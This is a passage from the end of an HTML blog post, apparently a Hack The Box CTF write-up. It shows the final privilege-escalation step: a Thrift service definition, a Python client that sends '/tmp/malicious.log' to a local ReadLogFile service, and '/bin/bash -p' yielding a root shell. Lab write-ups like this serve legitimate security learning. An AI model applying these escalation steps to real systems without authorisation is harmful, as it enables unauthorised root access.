+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span> <span style="color:#a6e22e">ReadLogFile</span>(<span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">string</span> <span style="color:#a6e22e">filePath</span>)  
+</span></span><span style="display:flex;"><span>}  
+</span></span></code></pre></div><p>and then using <code>thrift</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">thrift</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">gen</span> <span style="color:#a6e22e">py</span> <span style="color:#a6e22e">log_services</span>.<span style="color:#a6e22e">thrift</span>
+</span></span></code></pre></div><p>==&gt; Then we can create the <code>client.py</code> file inside of the <code>gen-py</code>folder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> thrift <span style="color:#f92672">import</span> Thrift  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> thrift.transport <span style="color:#f92672">import</span> TSocket  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> thrift.transport <span style="color:#f92672">import</span> TTransport  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> thrift.protocol <span style="color:#f92672">import</span> TBinaryProtocol  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> log_service <span style="color:#f92672">import</span> LogService <span style="color:#75715e"># Import generated Thrift client code  </span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():  
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Set up a transport to the server  </span>
+</span></span><span style="display:flex;"><span>	transport <span style="color:#f92672">=</span> TSocket<span style="color:#f92672">.</span>TSocket(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">9090</span>)  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Buffering for performance  </span>
+</span></span><span style="display:flex;"><span>	transport <span style="color:#f92672">=</span> TTransport<span style="color:#f92672">.</span>TBufferedTransport(transport)  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Using a binary protocol  </span>
+</span></span><span style="display:flex;"><span>	protocol <span style="color:#f92672">=</span> TBinaryProtocol<span style="color:#f92672">.</span>TBinaryProtocol(transport)  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Create a client to use the service  </span>
+</span></span><span style="display:flex;"><span>	client <span style="color:#f92672">=</span> LogService<span style="color:#f92672">.</span>Client(protocol)  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Open the connection  </span>
+</span></span><span style="display:flex;"><span>	transport<span style="color:#f92672">.</span>open()  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:  
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Specify the log file path to process  </span>
+</span></span><span style="display:flex;"><span>		log_file_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/malicious.log&#34;</span>  
+</span></span><span style="display:flex;"><span>		  
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Call the remote method ReadLogFile and get the result  </span>
+</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>ReadLogFile(log_file_path)  
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;Server response:&#34;</span>, response)  
+</span></span><span style="display:flex;"><span>	  
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> Thrift<span style="color:#f92672">.</span>TException <span style="color:#66d9ef">as</span> tx:  
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Thrift exception: </span><span style="color:#e6db74">{</span>tx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)  
+</span></span><span style="display:flex;"><span>		  
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Close the transport  </span>
+</span></span><span style="display:flex;"><span>	transport<span style="color:#f92672">.</span>close()  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:  
+</span></span><span style="display:flex;"><span>	main()  
+</span></span></code></pre></div><p>We can then run this file and we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 client.py  
+</span></span><span style="display:flex;"><span>Server response: Log file processed
+</span></span></code></pre></div><p>and once back on <code>margo</code>&rsquo;s machine we can type:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -p
+</span></span></code></pre></div><p>and we get a root shell!!</p>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/machine/" rel="tag">Machine</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/box/" rel="tag">Box</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/alien-cradle/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Alien cradle</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
